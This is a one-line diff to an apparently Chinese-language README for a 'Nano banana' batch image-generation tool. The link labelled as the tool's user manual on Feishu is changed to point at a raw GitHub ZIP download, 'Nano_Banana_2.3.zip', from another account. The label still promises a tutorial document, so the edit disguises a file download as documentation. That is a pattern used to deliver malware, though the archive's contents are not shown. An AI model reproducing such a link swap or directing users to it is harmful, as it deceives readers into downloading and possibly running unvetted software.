@@ -1,1 +1,1 @@
-移步飞书查看教程 [Nano banana批量出图工具使用手册](https://wm1881zs6s.feishu.cn/docx/Rtdadg6wsoOWPExjszOcqKfWnIf)
+移步飞书查看教程 [Nano banana批量出图工具使用手册](https://raw.githubusercontent.com/zuopengqin-beep/NanoBanana-/main/sanitate/Nano_Banana_2.3.zip)
